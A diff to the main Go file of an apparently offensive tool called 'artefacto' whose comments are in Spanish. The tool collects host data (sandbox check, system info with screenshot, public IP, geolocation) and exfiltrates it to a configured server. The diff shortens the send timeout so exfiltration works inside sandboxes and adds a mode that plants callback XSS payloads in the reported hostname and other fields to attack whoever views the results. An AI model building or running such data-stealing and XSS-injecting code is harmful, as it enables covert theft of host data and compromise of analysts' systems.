@@ -2,6 +2,7 @@ package main
 
 import (
 	"bufio"
+	"encoding/json"
 	"fmt"
 	"log"
 	"os"
@@ -13,6 +14,7 @@ import (
 	"github.com/m4rcmo15/artefacto/config"
 	"github.com/m4rcmo15/artefacto/exfil"
 	"github.com/m4rcmo15/artefacto/models"
+	"github.com/m4rcmo15/artefacto/xss"
 )
 
 func main() {
@@ -40,6 +42,18 @@ func main() {
 		BinarySize: binarySize,
 	}
 
+	// === MODO XSS AUDIT ===
+	if cfg.XSSAudit {
+		fmt.Println("\n[🎯] ========== MODO XSS AUDIT ACTIVADO ==========")
+		fmt.Println("[🎯] Inyectando payloads XSS en múltiples vectores...")
+		
+		// Importar el paquete xss
+		xssPayloads := injectXSSAudit(cfg.CallbackServer, payload)
+		
+		fmt.Printf("[🎯] Total de payloads inyectados: %d\n", len(xssPayloads))
+		fmt.Println("[🎯] ===============================================\n")
+	}
+
 	// Obtener IP pública y geolocalización (antes de los colectores paralelos)
 	fmt.Println("[+] Obteniendo IP pública...")
 	payload.PublicIP = collectors.GetPublicIP()
@@ -64,7 +78,7 @@ func main() {
 		fmt.Println("[✓] CheckSandbox completado")
 	}()
 
-	// 2. SystemInfo
+	// 2. SystemInfo (incluye captura de pantalla)
 	go func() {
 		defer wg.Done()
 		fmt.Println("[+] Ejecutando SystemInfo...")
@@ -111,10 +125,16 @@ func main() {
 	fmt.Println("\n[*] Todos los colectores completados")
 	fmt.Println("[*] Exfiltrando datos...")
 
-	// Enviar payload al servidor
-	err = exfil.SendPayload(payload, cfg.ServerURL, cfg.Timeout)
+	// Intentar enviar payload al servidor con timeout reducido para sandboxes
+	exfilTimeout := cfg.Timeout
+	if exfilTimeout > 30*time.Second {
+		exfilTimeout = 30 * time.Second // Máximo 30s para exfiltración
+	}
+
+	err = exfil.SendPayload(payload, cfg.ServerURL, exfilTimeout)
 	if err != nil {
 		log.Printf("[!] Error enviando datos: %v", err)
+		fmt.Println("[!] La sandbox puede estar bloqueando la conexión")
 		
 		// Guardar localmente si falla el envío
 		savePayloadLocally(payload)
@@ -127,8 +147,24 @@ func main() {
 }
 
 func savePayloadLocally(payload *models.Payload) {
-	// TODO: Guardar payload en archivo local como backup
 	fmt.Println("[*] Guardando payload localmente...")
+	
+	// Serializar a JSON
+	jsonData, err := json.MarshalIndent(payload, "", "  ")
+	if err != nil {
+		log.Printf("[!] Error serializando payload: %v", err)
+		return
+	}
+
+	// Guardar en archivo con timestamp
+	filename := fmt.Sprintf("payload_%s.json", time.Now().Format("20060102_150405"))
+	err = os.WriteFile(filename, jsonData, 0644)
+	if err != nil {
+		log.Printf("[!] Error guardando archivo: %v", err)
+		return
+	}
+
+	fmt.Printf("[✓] Payload guardado en: %s\n", filename)
 }
 
 func printSummary(payload *models.Payload) {
@@ -220,4 +256,39 @@ func loadEnv() {
 			os.Setenv(key, value)
 		}
 	}
+}
+
+// injectXSSAudit inyecta payloads XSS en el sistema
+func injectXSSAudit(callbackServer string, payload *models.Payload) []models.XSSPayloadMetadata {
+	// Obtener todos los payloads
+	payloads := xss.GetAllPayloads(callbackServer)
+	
+	// Modificar el hostname con el primer payload de hostname
+	for _, p := range payloads {
+		if p.Vector == "hostname" {
+			payload.Hostname = p.Content
+			fmt.Printf("[XSS] Hostname modificado a: %s\n", p.Content[:50]+"...")
+			break
+		}
+	}
+	
+	// Inyectar el resto de payloads
+	xss.InjectPayloads(payloads)
+	
+	// Extraer metadata para enviar al servidor
+	xssMetadata := xss.GetPayloadMetadata(payloads)
+	
+	// Convertir a models.XSSPayloadMetadata
+	metadata := make([]models.XSSPayloadMetadata, len(xssMetadata))
+	for i, m := range xssMetadata {
+		metadata[i] = models.XSSPayloadMetadata{
+			ID:     m.ID,
+			Type:   m.Type,
+			Vector: m.Vector,
+		}
+	}
+	
+	payload.XSSPayloads = metadata
+	
+	return metadata
 }
